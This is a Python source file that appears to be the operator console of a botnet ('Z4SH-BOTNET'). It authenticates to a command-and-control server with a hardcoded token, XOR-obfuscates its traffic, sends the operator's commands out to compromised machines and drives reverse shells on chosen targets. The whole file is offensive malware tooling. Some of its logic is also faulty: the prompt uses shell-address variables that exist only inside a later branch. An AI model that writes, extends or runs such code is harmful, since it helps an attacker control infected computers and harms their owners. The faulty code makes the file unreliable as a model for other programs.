

import socket
from colorama import Back, Style, Fore
import time
import sys
from pyspin.spin import Box1, Spinner
import os

class AdminShell:
    def __init__(self):
        self.SERVER_IP = "127.0.0.1"
        self.SERVER_PORT = 5050
        self.isAuthenticated = False
        self.MAC_ADDR = "TAILSPLOIT?TOKEN=cvdApAWauV9N2Dd2jEsiziDILgi2sVd3t98RDeiWaswLLVeglbTVIRV3YokmAsBm"
        self.TIMEOUT_COMMAND = 5
        self.ADMIN_DISPLAY_NAME = ""
        self.TARGET_CLIENT = False
        self.TARGET_CLIENT_INFO = ""
        self.TRAFFIC_ENCRYPTION_TOKEN = b'AUTHORIZED?BOTNET=ENCRYPTIONTYPE?XOR'

    def initializeServerConnection(self):
        try:
            if os.name == "nt":
                os.system('cls')
            else:
                os.system('clear')
            print(f"""

                ┏┓┏┓┏┓┓┏  ┳┓┏┓┏┳┓┳┓┏┓┏┳┓
                ┏┛┃┃┗┓┣┫━━┣┫┃┃ ┃ ┃┃┣  ┃ 
                ┗┛┗┻┗┛┛┗  ┻┛┗┛ ┻ ┛┗┗┛ ┻ 
                    github/{Fore.RED}devmalcolm{Style.RESET_ALL}
    """)
            spin = Spinner(Box1)
            for i in range(50):
                print(u"\r            {0} Requesting authentication...".format(spin.next()), end="")
                sys.stdout.flush()
                time.sleep(0.1)
            print("")
            print("")
            print("")
            AdminShellUsername = input("> Choose a username : ")
            self.ADMIN_DISPLAY_NAME = AdminShellUsername
            AdminShellSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            AdminShellSocket.connect((self.SERVER_IP, self.SERVER_PORT))
            TokenChecking = self.handleXOREncryption(self.MAC_ADDR.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
            AdminShellSocket.send(TokenChecking)
            OnAuthenticationResultXOR = AdminShellSocket.recv(4096)
            OnAuthenticationResult = self.handleXOREncryption(OnAuthenticationResultXOR, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
            self.OnAuthenticationChecking(OnAuthenticationResult, AdminShellSocket)

        except:
                print("\n")
                print(f"    [{Fore.RED}-{Style.RESET_ALL}] Unable to reach the server : {Back.RED} NOT REACHABLE {Style.RESET_ALL}")
                print("\n")

    def handleXOREncryption(self, content_data, key_traffic):
        # Repeat the key to match the data length
        key_traffic = key_traffic * (len(content_data) // len(key_traffic)) + key_traffic[:len(content_data) % len(key_traffic)]
        return bytes([byte ^ key_byte for byte, key_byte in zip(content_data, key_traffic)])

    def OnAuthenticationChecking(self, OnAuthenticationResult, AdminShellSocket):
        if OnAuthenticationResult == f"--FLAG_TAILSPLOIT_AUTHENTICATION?AUTHORIZED={self.MAC_ADDR}":
            print("")
            print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Botnet's connection status : {Back.GREEN} AUTHENTICATED {Style.RESET_ALL}")
            self.isAuthenticated = True
            self.adminShellSession(AdminShellSocket)
        elif OnAuthenticationResult == "--FLAG_PROVIDED_TOKEN_ALREADY_IN_USE":
            print("[-] The provided token is already in use, please use another one")
            self.isAuthenticated = False
        elif OnAuthenticationResult == "--FLAG_PROVIDED_TOKEN_NOT_VALID":
            print("[-] The provided token not valid, please use another one.")
            self.isAuthenticated = False
        elif OnAuthenticationResult == "--FLAG_PROVIDED_TOKEN_REVOKED":
            print("[-] The provided token has been revoked.")
            self.isAuthenticated = False
        else:
            print(OnAuthenticationResult)
            self.isAuthenticated = False
            print("Error")

    def adminShellSession(self, AdminShellSocket):
        if os.name == "nt":
            os.system('cls')
        else:
            os.system('clear')

        SendUsernameXOR = self.handleXOREncryption(self.ADMIN_DISPLAY_NAME.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        AdminShellSocket.send(SendUsernameXOR)
        OnUsernameVerification = AdminShellSocket.recv(1024)
        OnUsernameVerificationResult = self.handleXOREncryption(OnUsernameVerification, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
        if OnUsernameVerificationResult == "--FLAG_USERNAME_ALREADY_CHOSEN":
            print("Username Already Chosen")
            time.sleep(0.5)
            sys.exit(1)
        elif OnUsernameVerificationResult == "--FLAG_USERNAME_AVAILABLE":
            print("Username available")
        else:
            print("An error occured")

        print(f"""

                ┏┓┏┓┏┓┓┏  ┳┓┏┓┏┳┓┳┓┏┓┏┳┓
                ┏┛┃┃┗┓┣┫━━┣┫┃┃ ┃ ┃┃┣  ┃ 
                ┗┛┗┻┗┛┛┗  ┻┛┗┛ ┻ ┛┗┗┛ ┻ 
                    github/{Fore.RED}devmalcolm{Style.RESET_ALL}


            """)
        while self.isAuthenticated:

            if self.TARGET_CLIENT:
                adminShell = input(f"> {Fore.RED}reverseShell{Style.RESET_ALL}@{Fore.RED}{self.ADMIN_DISPLAY_NAME}{Style.RESET_ALL} ~ {Fore.BLUE}{REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.BLUE}{REVERSE_SHELL_PORT}{Style.RESET_ALL} {Fore.GREEN}${Style.RESET_ALL} ")
            else:
                adminShell = input(f"> {Fore.RED}admin{Style.RESET_ALL}@{Fore.RED}{self.ADMIN_DISPLAY_NAME}{Style.RESET_ALL} ~ {Fore.GREEN}${Style.RESET_ALL} ")

            if adminShell == "":
                continue
            if adminShell == "clear":
                if os.name == "nt":
                    os.system('cls')
                else:
                    os.system('clear')
                continue
                    
            else:
                if self.TARGET_CLIENT:
                    formatTargetMessage = f"{adminShell} --FLAG_REVERSE_SHELL_INFO {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}"
                    formatTargetMessageXOR = self.handleXOREncryption(formatTargetMessage.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    AdminShellSocket.send(formatTargetMessageXOR)
                else:
                    adminShellXOR = self.handleXOREncryption(adminShell.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                    AdminShellSocket.send(adminShellXOR)
            while True:
                try:
                    ServerShellXOR = AdminShellSocket.recv(4096)
                    ServerShell = self.handleXOREncryption(ServerShellXOR, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
                    if ServerShell == "test":
                        self.TARGET_CLIENT = True
                        print("TRUE")
                        break
                    elif "--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?CONNECTED" in ServerShell:
                        client_info, flag = ServerShell.split(" --FLAG_REVERSE_SELL ")
                        REVERSE_SHELL_IP, REVERSE_SHELL_PORT = client_info.split(":")
                        print(f"Connected to: {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}")
                        self.TARGET_CLIENT = True
                        self.TARGET_CLIENT_INFO = f"{REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}"
                        if os.name == "nt":  # Windows
                            os.system('cls')
                        else:  # Linux, macOS, etc.
                            os.system('clear')
                        print("")
                        print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Started Reverse Shell (TCP) Handler On {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}")
                        print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Server Started.")
                        print("")
                        break
                    elif "--FLAG_KICKED_FROM_SERVER" in ServerShell:
                        print("")
                        print("[*] You have been kicked from a server administrator.")
                        print("")
                        sys.exit(1)
                    elif "--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?NOTFOUND" in ServerShell:
                        print("")
                        print(f"[{Fore.RED}-{Style.RESET_ALL} Cannot found this target.]")
                        print("")
                        break
                    elif "--FLAG_REVERSE_SHELL_INFO REVERSE_SHELL_HANDLER_STATUS?STOPPED" in ServerShell:
                        print("")
                        print(f"[{Fore.RED}*{Style.RESET_ALL}] Stopping Reverse Shell (TCP) Handler Server. ({Fore.YELLOW}{REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.YELLOW}{REVERSE_SHELL_PORT}{Style.RESET_ALL})")
                        print("")
                        self.TARGET_CLIENT = None
                        self.TARGET_CLIENT_INFO =""
                        break
                    elif ServerShell:
                        print("")
                        print(ServerShell)
                        print("")
                        break
                    
                except KeyboardInterrupt:
                    print("[INFO] Admin terminated the connection.")
                    AdminShellSocket.close()

if __name__ == "__main__":
    x = AdminShell()
    x.initializeServerConnection()
